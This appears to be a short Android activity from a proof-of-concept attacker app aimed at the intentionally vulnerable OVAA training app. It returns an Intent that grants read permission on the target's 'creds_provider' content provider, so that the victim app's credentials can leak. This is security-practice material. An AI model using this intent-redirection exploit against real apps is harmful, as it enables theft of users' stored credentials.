package com.mbl.test.paddleactivity;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class CPLeakerActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
//        setContentView(R.layout.activity_leaker);
        Log.e("LOG","Started CPLeaker");
        Intent i = new Intent();
        i.setClassName("com.mbl.test.paddleactivity", "com.mbl.test.paddleactivity.RealLeaker");
        i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        i.setData(Uri.parse("content://oversecured.ovaa.creds_provider"));
//        i.putExtra("flag", 1999);
        setResult(-1, i);
        Log.d("LOG","retrieving data after flag grant read uri");
        Log.d("LOG","Intent is :"+i.toString());
//        startActivity(i);
        finish();
    }
}